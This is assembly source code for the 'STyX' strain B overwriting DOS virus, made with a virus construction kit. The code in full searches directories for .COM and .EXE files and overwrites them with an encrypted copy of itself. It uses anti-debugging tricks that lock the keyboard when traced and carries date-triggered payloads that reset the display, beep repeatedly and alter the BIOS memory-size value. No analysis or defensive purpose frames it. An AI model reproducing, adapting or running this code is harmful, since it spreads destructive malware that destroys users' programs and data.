

; STYX-5B.ASM -- STyX virus strain B
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Mike Webber

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

main            proc    near
flag:           xchg    cx,ax
		xchg    ah,ah
		xchg    cx,ax

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

stop_tracing:   mov     cx,09EBh
		mov     ax,0FE05h               ; Acutal move, plus a HaLT
		jmp     $-2
		add     ah,03Bh                 ; AH now equals 025h
		jmp     $-10                    ; Execute the HaLT
		mov     bx,offset null_vector   ; BX points to new routine
		push    cs                      ; Transfer CS into ES
		pop     es                      ; using a PUSH/POP
		int     021h
		mov     al,1                    ; Disable interrupt 1, too
		int     021h
		jmp     short skip_null         ; Hop over the loop
null_vector:    jmp     $                       ; An infinite loop
skip_null:      mov     byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:      mov     al,128                  ; Change here screws DEBUG
		out     021h,al                 ; If tracing then lock keyboard

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		xchg    dx,ax                   ; AX holds clock ticks
		mov     cx,0007h                ; We'll divide by 7
		cwd                             ; Sign-extend AX into DX:AX
		div     cx                      ; Divide AX by CX
		cmp     dx,0005h                ; Is the remaindier >= 5?
		jge     no_infection            ; If not then don't spread
		call    search_files            ; Find and infect a file
no_infection:
		call    get_day
		cmp     ax,2AF9h                ; Did the function return 11001?
		je      strt00                  ; If equal, do effect
		jmp     end00                   ; Otherwise skip over it
strt00:         mov     ah,0Fh                  ; BIOS get video mode function
		int     010h
		xor     ah,ah                   ; BIOS set video mode function
		int     010h

end00:          call    get_day
		cmp     ax,7D00h                ; Did the function return 32000?
		je      strt01                  ; If equal, do effect
		jmp     end01                   ; Otherwise skip over it
strt01:         mov     cx,7D00h                ; First argument is 32000
		jcxz    beep_end                ; Exit if there are no beeps
		mov     ax,0E07h                ; BIOS display char., BEL
beep_loop:      int     010h                    ; Beep
		loop    beep_loop               ; Beep until --CX = 0
beep_end:

end01:          call    get_day
		cmp     ax,7CE1h                ; Did the function return 31969?
		jne     strt02                  ; If not equal, do effect
		jmp     end02                   ; Otherwise skip over it
strt02:         mov     dx,7CE1h                ; First argument is 31969
		push    es                      ; Save ES
		mov     ax,040h                 ; Set extra segment to 040h
		mov     es,ax                   ; (ROM BIOS)
		mov     word ptr es:[013h],dx   ; Store new RAM ammount
		pop     es                      ; Restore ES

end02:          mov     ax,04C00h               ; DOS terminate function
		int     021h
main            endp


		db      082h,0A4h,0CBh,031h,0EBh

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset root          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		mov     dx,offset all_files     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset up_dir        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		mov     dx,offset com_mask      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
		jnc     done_searching          ; If successful then exit
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
exe_mask        db      "*.EXE",0               ; Mask for all .EXE files
traverse        endp

		db      0A8h,090h,049h,034h,050h


find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

		db      038h,03Ch,0C7h,007h,0A6h

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
		jne     infection_done          ; If it is then exit

		cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je      infection_done          ; If it is then skip it

		cmp     word ptr [si + 01Ah],(finish - start)
		jb      infection_done          ; If it's too small then exit

		mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,4                    ; CX holds bytes to read (4)
		mov     dx,offset buffer        ; DX points to buffer
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		push    si                      ; Save DTA address before compare
		mov     si,offset buffer        ; SI points to comparison buffer
		mov     di,offset flag          ; DI points to virus flag
		mov     cx,4                    ; CX holds number of bytes (4)
	rep     cmpsb                           ; Compare the first four bytes
		pop     si                      ; Restore DTA address
		je      infection_done          ; If equal then exit
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


		db      09Ah,053h,045h,0F9h,041h

get_day         proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dl                   ; Copy day into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_day         endp

vcl_marker      db      "[VCL]",0               ; VCL creation marker


note            db      "Oh, by the way....."
		db      "...Your mom was wonderful!"

encrypt_code    proc    near
		mov     si,offset encrypt_decrypt; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 8],dx    ; Low word of timer is new key

		xor     byte ptr [si],1         ;
		xor     byte ptr [si + 7],1     ; Change all SIs to DIs
		xor     word ptr [si + 10],0101h; (and vice-versa)

		mov     di,offset finish        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		mov     si,offset write_stuff   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		mov     dx,offset start         ; DX points to virus

		call    finish                  ; Encrypt/write/decrypt

		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
		mov     si,offset start_of_code ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main

